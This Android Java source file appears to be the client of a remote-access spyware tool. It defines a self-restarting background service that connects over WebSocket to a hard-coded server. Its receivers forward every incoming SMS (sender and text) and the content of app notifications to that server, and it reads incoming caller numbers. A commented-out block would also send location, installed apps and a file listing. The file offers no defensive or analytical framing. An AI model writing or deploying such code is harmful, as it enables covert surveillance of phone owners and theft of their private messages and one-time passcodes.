package com.ot.grhq.client;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Location;
import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.URI;
import java.net.URISyntaxException;

public class MainService extends Service {

    private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";
    private static final String SERVER_URI = "ws://192.168.8.102:8080";

    private static WebSocketClient client;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            client = new WebSocketClient(getApplicationContext(), new URI(SERVER_URI));
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }

        if (!client.isOpen())
            client.connect();

//        try {
//            JSONObject json = new JSONObject();
//            Object location = Location.getLastKnownLocation(getApplicationContext());
//            Object installedApps = PackageManager.getInstalledApps(getApplicationContext());
//            Object files = FileManager.listFiles("/");
//
//            json.put("location", location.toString());
//            json.put("installed_apps", installedApps.toString());
//            json.put("files", files.toString());
//            client.send(json.toString());
//        } catch (URISyntaxException e) {
//            throw new RuntimeException(e);
//        } catch (JSONException e) {
//            throw new RuntimeException(e);
//        }

        Log.d("eeee", "First");
        final Handler handler = new Handler();
        final int delay = 1000;

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                handler.postDelayed(this, delay);
            }
        }, delay);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        Intent restartService = new Intent(SERVICE_RESTART_INTENT);
        sendBroadcast(restartService);
    }

    /**
     * Phone call broadcast receiver
     */
    public static class Call extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() != null && intent.getAction().equals("android.intent.action.PHONE_STATE")) {
                // Get the phone state from the intent
                String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

                if (phoneState != null) {
                    if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                        // Incoming call is ringing
                        String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                    } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        // Call is in progress (either incoming or outgoing)

                    } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        // Call has ended

                    }
                }
            }
        }
    }


    /**
     * SMS notification receiver
     */
    public static class SMS extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    // Retrieve the SMS messages received.
                    Object[] pdus = (Object[]) bundle.get("pdus");

                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdu);

                            String senderNumber = currentMessage.getDisplayOriginatingAddress();
                            String messageBody = currentMessage.getDisplayMessageBody();

                            if (!senderNumber.isEmpty() && !messageBody.isEmpty() && client.isOpen() && client != null) {
                                JSONObject json = new JSONObject();
                                try {
                                    json.put("client_id", Utils.clientID(context));
                                    json.put("type", "client");
                                    json.put("res", "message");
                                    json.put("sender", senderNumber);
                                    json.put("content", messageBody);
                                    json.put("timestamp", System.currentTimeMillis());

                                    client.send(json.toString());
                                } catch (JSONException e) {
                                    throw new RuntimeException(e);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /**
     * Notifications broadcast receiver
     */
    public static class NotificationReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            if ("notification_data".equals(intent.getAction())) {
                String packageName = intent.getStringExtra("package_name");
                String notificationContent = intent.getStringExtra("notification_content");

                // Use the WebSocketService to send data to the WebSocket
                if (client != null && client.isOpen()) {
                    JSONObject json = new JSONObject();
                    try {
                        json.put("id", Utils.clientID(context));
                        json.put("type", "client");
                        json.put("res", "notification");
                        json.put("sender", packageName);
                        json.put("content", notificationContent);
                        json.put("timestamp", System.currentTimeMillis());

                        client.send(json.toString());
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        }
    }
}


